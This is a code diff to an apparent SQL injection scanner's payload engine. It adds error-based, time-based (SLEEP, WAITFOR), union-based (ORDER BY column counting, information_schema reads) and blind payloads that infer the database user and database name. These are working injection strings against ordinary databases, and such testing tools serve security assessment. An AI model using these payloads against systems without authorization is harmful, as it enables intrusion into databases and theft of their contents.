@@ -134,7 +134,7 @@ class PayloadSet:
 class PayloadEngine:
     """Engine for generating and mutating SQL injection payloads."""
     
-    def __init__(self, max_payloads: int = 100):
+    def __init__(self, max_payloads: int = 150):
         self.max_payloads = max_payloads
         self._payloads: Dict[PayloadType, List[Payload]] = {}
         self._custom_payloads: List[Payload] = []
@@ -235,6 +235,15 @@ class PayloadEngine:
             Payload(value="0x27", payload_type=PayloadType.ERROR_BASED, category="hex_quote", description="Hex quote", expected_behavior="SQL error", risk_level="medium"),
             Payload(value="',", payload_type=PayloadType.ERROR_BASED, category="quote_comma", description="Quote comma", expected_behavior="SQL error", risk_level="high"),
             Payload(value="')/", payload_type=PayloadType.ERROR_BASED, category="quote_slash", description="Quote slash", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="')", payload_type=PayloadType.ERROR_BASED, category="quote_paren", description="Quote paren", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="having 1=1", payload_type=PayloadType.ERROR_BASED, category="having", description="HAVING clause", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="1'1", payload_type=PayloadType.ERROR_BASED, category="double_quote2", description="Double 1 quote", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="1\"1", payload_type=PayloadType.ERROR_BASED, category="double_num", description="Double num quote", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="`", payload_type=PayloadType.ERROR_BASED, category="backtick", description="Backtick", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="''", payload_type=PayloadType.ERROR_BASED, category="double_single", description="Double single", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="\"\"", payload_type=PayloadType.ERROR_BASED, category="double_dquote2", description="Double double2", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="%%27", payload_type=PayloadType.ERROR_BASED, category="double_enc", description="Double encode", expected_behavior="SQL error", risk_level="high"),
+            Payload(value="1 or 1=1", payload_type=PayloadType.ERROR_BASED, category="lower_or", description="Lower OR", expected_behavior="SQL error", risk_level="high"),
         ]
         return payloads
     
@@ -266,6 +275,10 @@ class PayloadEngine:
             Payload(value="1\" AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_dquote", description="MySQL double quote", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
             Payload(value="1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5)--", payload_type=PayloadType.TIME_BASED, category="mysql_count", description="MySQL COUNT delay", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
             Payload(value="1' AND ELT(1=1,SLEEP(5),0)--", payload_type=PayloadType.TIME_BASED, category="mysql_elt", description="MySQL ELT", database_target="mysql", expected_behavior="Response delayed 5s", risk_level="high"),
+            Payload(value="1 AND SLEEP(4)--", payload_type=PayloadType.TIME_BASED, category="mysql_4sec", description="MySQL 4s delay", database_target="mysql", expected_behavior="Response delayed 4s", risk_level="medium"),
+            Payload(value="1' AND SLEEP(6)--", payload_type=PayloadType.TIME_BASED, category="mysql_6sec", description="MySQL 6s delay", database_target="mysql", expected_behavior="Response delayed 6s", risk_level="high"),
+            Payload(value="1; WAITFOR DELAY '00:00:03'--", payload_type=PayloadType.TIME_BASED, category="mssql_3sec", description="MSSQL 3s delay", database_target="mssql", expected_behavior="Response delayed 3s", risk_level="medium"),
+            Payload(value="1' AND SLEEP(0)--", payload_type=PayloadType.TIME_BASED, category="mysql_0sec", description="MySQL 0s delay", database_target="mysql", expected_behavior="No delay", risk_level="low"),
         ]
         return payloads
     
@@ -304,6 +317,13 @@ class PayloadEngine:
             Payload(value="' LIMIT 1 OFFSET 0--", payload_type=PayloadType.UNION_BASED, category="union_limit", description="LIMIT OFFSET", expected_behavior="Different response", risk_level="medium"),
             Payload(value="' UNION ALL SELECT NULL--%23", payload_type=PayloadType.UNION_BASED, category="union_hash", description="UNION hash", expected_behavior="Bypass WAF", risk_level="medium"),
             Payload(value="1) ORDER BY 1--", payload_type=PayloadType.UNION_BASED, category="orderby_paren", description="ORDER BY paren", expected_behavior="Error or diff", risk_level="medium"),
+            Payload(value="' UNION ALL SELECT 1,2,3--", payload_type=PayloadType.UNION_BASED, category="union_all_123", description="UNION ALL 1-3", expected_behavior="Different response", risk_level="high"),
+            Payload(value="1' ORDER BY 6--", payload_type=PayloadType.UNION_BASED, category="orderby6", description="ORDER BY 6", expected_behavior="Error or diff", risk_level="medium"),
+            Payload(value="1' ORDER BY 7--", payload_type=PayloadType.UNION_BASED, category="orderby7", description="ORDER BY 7", expected_behavior="Error or diff", risk_level="medium"),
+            Payload(value="1' ORDER BY 8--", payload_type=PayloadType.UNION_BASED, category="orderby8", description="ORDER BY 8", expected_behavior="Error or diff", risk_level="medium"),
+            Payload(value="1' ORDER BY 9--", payload_type=PayloadType.UNION_BASED, category="orderby9", description="ORDER BY 9", expected_behavior="Error or diff", risk_level="medium"),
+            Payload(value="1' ORDER BY 10--", payload_type=PayloadType.UNION_BASED, category="orderby10", description="ORDER BY 10", expected_behavior="Error or diff", risk_level="medium"),
+            Payload(value="' UNION SELECT table_schema FROM information_schema.tables--", payload_type=PayloadType.UNION_BASED, category="union_schema", description="UNION schema", expected_behavior="Schema info", risk_level="high"),
         ]
         return payloads
     
@@ -344,6 +364,10 @@ class PayloadEngine:
             Payload(value="1' AND 1=CONVERT(int,(SELECT top 1 table_name FROM information_schema.tables))--", payload_type=PayloadType.BLIND, category="blind_convert", description="Blind CONVERT", expected_behavior="Error or diff", risk_level="high"),
             Payload(value="1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NOT NULL--", payload_type=PayloadType.BLIND, category="blind_oracle", description="Oracle pipe", expected_behavior="Response delayed", risk_level="high"),
             Payload(value="1' AND (SELECT COUNT(*) FROM dual) > 0--", payload_type=PayloadType.BLIND, category="blind_dual", description="Oracle dual", expected_behavior="Response differs", risk_level="medium"),
+            Payload(value="1 AND (SELECT LENGTH(user()) > 0)--", payload_type=PayloadType.BLIND, category="blind_user_len", description="Blind user length", expected_behavior="Response differs", risk_level="medium"),
+            Payload(value="1' AND (SELECT SUBSTRING(user(),1,1)='a')--", payload_type=PayloadType.BLIND, category="blind_substr_user", description="Blind substr user", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="1' AND (SELECT database()='test')--", payload_type=PayloadType.BLIND, category="blind_db", description="Blind database", expected_behavior="Response differs", risk_level="high"),
+            Payload(value="1 AND 1=1 AND 1=1", payload_type=PayloadType.BLIND, category="blind_double2", description="Blind double AND", expected_behavior="Response differs", risk_level="medium"),
         ]
         return payloads
 
